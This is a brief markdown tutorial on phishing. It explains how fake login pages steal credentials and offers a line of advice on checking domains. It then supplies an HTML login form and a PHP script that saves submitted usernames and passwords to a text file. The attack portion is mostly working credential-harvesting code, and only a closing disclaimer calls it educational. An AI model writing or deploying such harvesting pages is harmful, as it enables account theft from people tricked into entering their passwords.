# Phishing Tutoral
If you haven't heard about ```phishing``` , then you should. Phising is an old, traditional way to retrieve your account password. The basic idea behind phishing is to create a copy of login or whole website and allow user to login so as to save account credentials. 
eg. an attacker creates a copy of gmail page, which exactly looks similar to the original, but coded in a way that it will store credentials whenever someone tries to login through that page. Now the attacker will share the link of his phising page somehow (through mails, messages, web links, etc.) and attacker has all the credentials of all the users who tried to login through phishing page.

### For security: Always confirm the url of the website you're loggin in. Don't try to login with your original credentials on some fake, similar looking page having some other domain.
ie. don't try to login on phishing.etc/github (some github phishing page) with your original github.com credentials. 
Note that git-hub.com and github.com are two different domains. :D

# Let's start some phishing stuff
We will use ```PHP``` to manage our data and store the credentials in flat files.
In this tutorial we are not going to copy any page but in reality, phishing pages are exactly similar to original pages.
This can be simply achieved by copying the source code.
Okay, enough intro, let's make it work.

Here is simple html form

```
<form action="save.php" method="POST">
  Username:
  <input type="text" name="username"/>
  <input type="password" name="password"/>
</form>
```

This sends the victim to ```save.php``` this is where the credentials will be stored.
Code:

```
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$file = fopen("data.txt", "a") or die("some error occured"); //open file, create if doesn't exist
$txt = "$username $password\n"; //store data as username password
fwrite($file, $txt); //write to our file
fclose($file); //close the file handle

echo 'Your username and password is stored in our database. Change it soon!';

```

Done. Pretty easy!

#### Note: This tutorial for educational purpose don't use it for illegal purposes.
